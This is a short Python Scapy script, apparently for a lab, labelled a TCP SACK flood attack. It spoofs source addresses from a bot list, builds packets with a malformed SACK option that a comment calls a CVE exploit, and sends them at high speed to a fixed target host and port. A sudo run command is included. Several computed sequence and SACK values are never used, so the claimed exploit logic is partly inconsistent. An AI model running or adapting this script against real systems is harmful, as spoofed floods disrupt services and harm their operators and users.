from scapy.all import *
import random
import time
import ipaddress

TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "bots.txt"

def load_bots(filename):
    bot_ips = []
    with open(BOTFILE, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_tcp_sack_flood_attack():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    for _ in range(100):
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        seq_num = random.randint(0, 4294967295)
        sack_start = random.randint(0, 2**32 - 1)
        sack_end = sack_start - random.randint(1000, 100000)
        tcp_layer = TCP(
            sport=RandShort(), dport=TARGET_PORT, flags='A', seq=1000, ack=2000, window=8192,
            options=[(5, b'\x02\x01')]  # malformed SACK (CVE exploit)
        )
        packet = eth_layer / ip_layer / tcp_layer
        lista_de_pacotes.append(packet)

    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nEnvio concluído.")
    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")

if __name__ == "__main__":
    run_tcp_sack_flood_attack()



# sudo PYTHONPATH=$HOME/scapy python3 tcp_sack.py